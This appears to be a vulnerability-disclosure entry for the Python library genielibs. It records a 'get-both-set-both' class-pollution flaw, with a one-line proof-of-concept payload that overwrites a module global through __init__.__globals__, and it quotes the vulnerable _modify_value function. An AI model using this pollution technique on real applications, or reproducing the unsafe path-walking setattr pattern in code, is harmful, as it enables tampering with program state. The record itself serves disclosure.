## genielibs

### Meta

+ Repo: genielibs
+ Link: https://github.com/CiscoTestAutomation/genielibs
+ Stars: 109
+ Version: V24.9
+ CVE: N/A
+ VulnType: get-both-set-both
+ Status: Pending
+ Payload: ```genie.libs.sdk.libs.utils.mapping.Mapping._modify_value(obj, ["__init__", "__globals__", "__name__"], 'polluted')```
+ Foundby: Pyrl
+ Report: Pending
+ AppType: Lib
+ Input: Func

### Vulnerable Code Snippet

```
def _modify_value(snapshot, path, value):
        for p in path[:-1]:
            try:
                snapshot = snapshot[p]
            except (TypeError):
                snapshot = getattr(snapshot, p)
        if isinstance(snapshot, dict):
            snapshot[path[-1]] = value
        else:
            setattr(snapshot, path[-1], value)
```
